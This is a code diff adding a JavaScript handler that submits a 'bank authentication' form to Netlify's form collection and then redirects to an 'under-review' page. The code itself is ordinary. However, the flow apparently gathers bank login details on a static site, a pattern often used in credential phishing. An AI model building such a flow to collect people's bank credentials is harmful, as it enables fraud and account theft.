@@ -367,6 +367,45 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     }
 
+    // Bank Authentication Form Handler
+    const bankAuthForm = document.getElementById('bankAuthForm');
+    if (bankAuthForm) {
+        bankAuthForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const submitBtn = bankAuthForm.querySelector('.submit-btn');
+            const btnText = submitBtn.querySelector('.btn-text');
+            const btnLoading = submitBtn.querySelector('.btn-loading');
+            
+            // Show loading state
+            btnText.style.display = 'none';
+            btnLoading.style.display = 'inline-block';
+            submitBtn.disabled = true;
+            
+            // Collect form data
+            const formData = new FormData(bankAuthForm);
+            formData.append('form-name', 'bank-authentication');
+            
+            // Submit to Netlify
+            fetch('/', {
+                method: 'POST',
+                body: formData
+            })
+            .then(() => {
+                // Redirect to under-review page after successful submission
+                window.location.href = 'under-review.html';
+            })
+            .catch(error => {
+                console.error('Bank authentication submission error:', error);
+                // Reset button state on error
+                btnText.style.display = 'inline-block';
+                btnLoading.style.display = 'none';
+                submitBtn.disabled = false;
+                alert('There was an error submitting your bank authentication. Please try again.');
+            });
+        });
+    }
+
     // Add some additional styling for form validation
     const style = document.createElement('style');
     style.textContent = `
